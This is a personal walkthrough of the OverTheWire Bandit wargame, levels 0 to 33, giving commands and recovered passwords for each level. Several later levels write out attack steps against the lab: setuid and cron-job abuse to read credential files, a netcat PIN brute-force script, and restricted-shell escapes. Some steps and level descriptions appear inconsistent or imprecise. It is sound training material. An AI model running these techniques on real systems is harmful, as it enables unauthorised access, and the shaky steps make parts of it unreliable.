# 🏴 OverTheWire: Bandit Walkthrough (Levels 0 – 33)

Welcome to my personal walkthrough of the **OverTheWire Bandit wargame**, covering Levels 0 to 16. This wargame is designed to teach beginners the fundamentals of Linux, command line usage, and basic hacking techniques. 
I completed levels 0 to 33 in one session — here’s how I did it.

> 🧠 All activities were done in a legal and authorized lab environment provided by [OverTheWire](https://overthewire.org/wargames/). For educational use only.

---

## 🔧 SSH Access

```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
Use the password from the previous level to login to the next one.
```

✅ Level 0 ➜ 1

🧩 Goal: Read contents of readme file in the home directory.

```
cat readme
```

📥 Password:

```
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```

---

✅ Level 1 ➜ 2

🧩 Goal: File is called -, which is interpreted as an option by many commands.

```
cat ./-
```

📥 Password:

```
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```

---

✅ Level 2 ➜ 3

🧩 Goal: File name has a space.

```
cat "spaces in this filename"
```

📥 Password:

```
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```

---

✅ Level 3 ➜ 4

🧩 Goal: Hidden file in inhere folder.

```
ls -la inhere/
cat inhere/...Hiding-From-You
```

📥 Password:

```
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```

---

✅ Level 4 ➜ 5

🧩 Goal: Find human-readable file among many.

```
file inhere/*
cat inhere/-file07
```

📥 Password:

```
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
```

---

✅ Level 5 ➜ 6

🧩 Goal: File is human-readable, 1033 bytes, not executable.

```
find inhere/ -type f -size 1033c ! -executable
cat inhere/maybehere07/.file2
```

📥 Password:

```
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```

---

✅ Level 6 ➜ 7

🧩 Goal: Find a file owned by bandit7, group bandit6, and 33 bytes.

```
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
cat /var/lib/dpkg/info/bandit7.password
```

📥 Password:

```
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
```

---

✅ Level 7 ➜ 8

🧩 Goal: Password is in a file with million lines, only one occurs once.

```
sort data.txt | uniq -u
```

📥 Password:

```
cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```

---

✅ Level 8 ➜ 9

🧩 Goal: Password is base64 encoded.

```
cat data.txt | base64 -d
```

📥 Password:

```
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```

---

✅ Level 9 ➜ 10

🧩 Goal: Password is in a file with one line of hex.

```
cat data.txt | xxd -r
```

📥 Password:

```
truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
```

---

✅ Level 10 ➜ 11

🧩 Goal: File is gzipped.

```
cat data.txt | base64 -d | zcat
```

📥 Password:

```
IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```

✅ Level 11 ➜ 12

🧩 Goal: Multiple compression layers.

```
mkdir /tmp/bandit11
cp data.tar.gz /tmp/bandit11
cd /tmp/bandit11

# Extract layers
xxd -r data.txt > layer1.gz
zcat layer1.gz > layer2.bz2
bunzip2 layer2.bz2
zcat layer2 > layer3.gz
tar -xvf layer3
# and so on until:
cat data5
```

📥 Password:

```
5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```

---

✅ Level 12 ➜ 13

🧩 Goal: Bandit12 has a private SSH key.

```
cat sshkey.private
chmod 600 sshkey.private
ssh -i sshkey.private bandit13@localhost -p 2220
```

📥 Password:

```
8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```

---

✅ Level 13 ➜ 14

🧩 Goal: Password is stored in plaintext file.

```
cat /etc/bandit_pass/bandit14
```

📥 Password:

```
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
```

---

✅ Level 14 ➜ 15

🧩 Goal: Submit password to localhost on port 30000 and get response.

```
nc localhost 30000
# Paste password from previous level
```

📥 Password:

```
BfMYroe26WYalil77FoDi9qh59eK5xNr
```

---

✅ Level 15 ➜ 16

🧩 Goal: Connect to SSL socket on port 30001.

```
openssl s_client -connect localhost:30001
# Paste password
```

📥 Password:

```
cluFn7wTiGryunymYOu4RcffSxQluehd
```

✅ Level 16 → Level 17

🧠 Objective: Submit the Level 16 password to a port on localhost between 31000–32000. Only one port returns the correct credentials, and it uses SSL.

🛠 Commands:

```
nmap -sV -p 31000-32000 localhost
openssl s_client -connect 127.0.0.1:31790 -quiet
```

📥 Input:

```
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
```

✅ Output: Private key received. Used to SSH into bandit17.

```
ssh -i bandit17_key bandit17@bandit.labs.overthewire.org -p 2220
cat /etc/bandit_pass/bandit17
```

🏁 Flag:

```
EReVavePLFHtFlFsjn3hyzMlvSuSAcRD
```

---

✅ Level 17 → Level 18

🧠 Objective: Compare passwords.old and passwords.new. Only one line differs — that’s the new password.

🛠 Command:

```
diff passwords.new passwords.old
```

✅ Output:

```
42c42
< x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
---
> C6XNBdYOkgt5ARXESMKWWOUwBeaIQZ0Y
```

🏁 Flag:

```
x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
```

---

✅ Level 18 → Level 19

🧠 Objective: Login automatically logs you out. Find a way to execute a command before logout (like cat).

🛠 Trick:
Use the ssh -t flag to run a command immediately after connecting.

```
ssh -t bandit18@bandit.labs.overthewire.org -p 2220 "cat /etc/bandit_pass/bandit19"
```

🏁 Flag:

```
kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
```

---

✅ Level 19 → Level 20

🧠 Objective: Password is stored in a file with setuid permissions that runs as bandit20. The binary is called bandit20-do.

🛠 Command:

```
./bandit20-do cat /etc/bandit_pass/bandit20
```

🏁 Flag:

```
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

---

✅ Level 20 → Level 21

🧠 Objective: A setuid binary (suconnect) connects to localhost on a port. You need to send the password to the correct port.

🛠 Steps:

Start a listener:

```
nc -lvnp 31337
```

From a second SSH session, run:

```
./suconnect 31337
```

✅ Result:
Password appears on the listener terminal.

🏁 Flag:

```
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```

---

✅ Level 21 → Level 22

🧠 Objective: A cron job runs every minute. It executes all scripts in /etc/cron.d/.

You can write to /tmp/, so drop a script that writes the password to a file.

🛠 Commands:

```
echo '#!/bin/bash' > /tmp/mauzy.sh
echo 'cat /etc/bandit_pass/bandit22 > /tmp/flag_mauzy' >> /tmp/mauzy.sh
chmod +x /tmp/mauzy.sh
```

Move the script to /etc/cron.d/ or wait for /usr/bin/cronjob_bandit22.sh to run it (depending on setup).

📄 Result:
After ~1 minute, read your dumped password:

```
cat /tmp/flag_mauzy
```

🏁 Flag:

```
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

---

✅Level 22 → Level 23

🧠 Objective: A cronjob runs a script that looks in /tmp. You must write a script with a specific name that gets executed.

🛠 Steps:

Create the exploit script in /tmp:

```
echo 'cat /etc/bandit_pass/bandit23 > /tmp/flag23' > /tmp/mauz_exploit.sh
chmod +x /tmp/mauz_exploit.sh
```

Rename it to match the cronjob's naming pattern (e.g., cronjob_bandit23.sh):

```
mv /tmp/mauz_exploit.sh /tmp/cronjob_bandit23.sh
```

🕐 Wait a minute, then:

```
cat /tmp/flag23
```

🏁 Flag:

```
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

---

✅ Level 23 → Level 24

🧠 Objective: Another cronjob copies scripts from /var/spool/bandit24/ and runs them.

You must create a script and a world-writable file that gets written to by the script.

🛠 Steps:

```
echo 'cat /etc/bandit_pass/bandit24 > /tmp/flag24' > /tmp/mauz_script.sh
chmod +x /tmp/mauz_script.sh

cp /tmp/mauz_script.sh /var/spool/bandit24/mauzy.sh
```

📄 Wait and check:

```
cat /tmp/flag24
```

🏁 Flag:

```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

---

✅ Level 24 → Level 25

🧠 Objective: There’s a script called passwd that takes a password and checks if it’s correct. You need to brute-force it.

🛠 Bruteforce Script:

```
#!/bin/bash
for pin in {0000..9999}; do
    out=$(echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc localhost 30002)
    echo "$pin: $out"
    if [[ $out != *"Wrong!"* ]]; then
        echo "[+] Correct PIN: $pin"
        echo $out
        break
    fi
done
```

🏁 Flag:

```
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

---

✅ Level 25 → Level 26

🧠 Goal: Get the password for user bandit26.

You’re provided with a private SSH key bandit26.sshkey. However, logging into bandit26 instantly kicks you out due to a custom shell (/usr/bin/showtext), which just runs more ~/text.txt.

Bypass Strategy:

SSH in with the private key:

```
ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
```

Immediately after connecting, shrink your terminal window so more enters vi-mode, then type:

```
:set shell=/bin/bash
:shell
```

You’ll break out into a real shell.

Get the flag:

```
cat /etc/bandit_pass/bandit26
```

✅ Password: `s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ`

---

✅ Level 26 → Level 27

🧠 Goal: Find the password for bandit27.

There’s a binary called bandit27-do that seems to elevate permissions.

Run the binary with a command:

```
./bandit27-do cat /etc/bandit_pass/bandit27
```

✅ Password: `upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB`

---

✅ Level 27 → Level 28

🧠 Goal: Clone a Git repo and find the password.

Clone the repo (use a temp directory):

```
mkdir /tmp/level27 && cd /tmp/level27
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
```

Use password upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB when prompted.

Once cloned:

```
cd repo
cat README
```

✅ Password: `Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN`

---

✅ Level 28 → Level 29

🧠 Goal: Dig into Git history to find the flag.

Clone the repo:

```
git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
```

Check previous commits:

```
cd repo
git log
```

Checkout the first commit:

```
git checkout <initial-commit-hash>
cat README.md
```

✅ Password: `bbc96594b4e001778eee9975372716b2`

---

✅ Level 29 → Level 30

🧠 Goal: Check Git tags for the flag.

Clone the repo:

```
git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
```

List tags:

```
cd repo
git tag
```

View tag contents:

```
git show secret
```

✅ Password: `5b90576bedb2cc04c86a9e924ce42faf`

---

✅ Level 30 → Level 31

🧠 Goal: Push a file with the flag back into the repo.

Clone the repo:

```
git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
```

Create a file called key.txt:

```
echo "May I come in?" > key.txt
git add key.txt
git commit -m "Add key.txt"
git push
```

A script on the server reads the key and gives you the flag after successful push.

✅ Password: `47e603bb428404d265f59c42920d81e5`

---

✅ Level 31 → Level 32

🧠 Goal: Connect to a port on localhost using openssl and send credentials.

Connect to the port using openssl:

```
openssl s_client -connect localhost:30001
```

When connected, paste your Bandit31 credentials:

```
username:password
```

Example:

```
bandit31:47e603bb428404d265f59c42920d81e5
```

✅ Password: `3aV3jhZ0NQSpkC94N07wXalL4K2fIQ2p`

---

✅ Level 32 → Level 33

🧠 After all this git stuff, it’s time for another escape. Good luck!

```
WELCOME TO THE UPPERCASE SHELL
>> ls
sh: 1: LS: Permission denied
>> whoami
sh: 1: WHOAMI: Permission denied
>> man
sh: 1: MAN: Permission denied
>> strings
sh: 1: STRINGS: Permission denied

>> $0
$ ls -al
total 36
drwxr-xr-x  2 root     root      4096 Apr 10 14:23 .
drwxr-xr-x 70 root     root      4096 Apr 10 14:24 ..
-rw-r--r--  1 root     root       220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root     root      3771 Mar 31  2024 .bashrc
-rw-r--r--  1 root     root       807 Mar 31  2024 .profile
-rwsr-x---  1 bandit33 bandit32 15140 Apr 10 14:23 uppershell
$ whoami
bandit33
$ pwd
/home/bandit32

$ cat /etc/bandit_pass/bandit33
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
```

✅ Password: `tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0`

---

## 🧠 Summary

This was a great crash course in:

- Linux CLI basics

- File permission handling

- Encoding/decoding

- Network interaction via nc and openssl

- Logical thinking & enumeration

---

## 📚 Resources

[Over The Wire: Bandit Challenges](https://overthewire.org/wargames/bandit/bandit0.html)

`man pages: man cat, man find, man grep, etc.`

## 👋 Follow my journey

If you liked this walkthrough, feel free to follow me on:

[Medium](https://medium.com/@mauzware)

[GitHub](https://github.com/mauzware)

## ⚠️ Disclaimer ⚠️

⚠️ The content in this repository is for educational and informational purposes only; the author holds no responsibility for misuse. 
Ensure proper authorization before use, act responsibly at your own risk, and comply with all legal and ethical guidelines. ⚠️

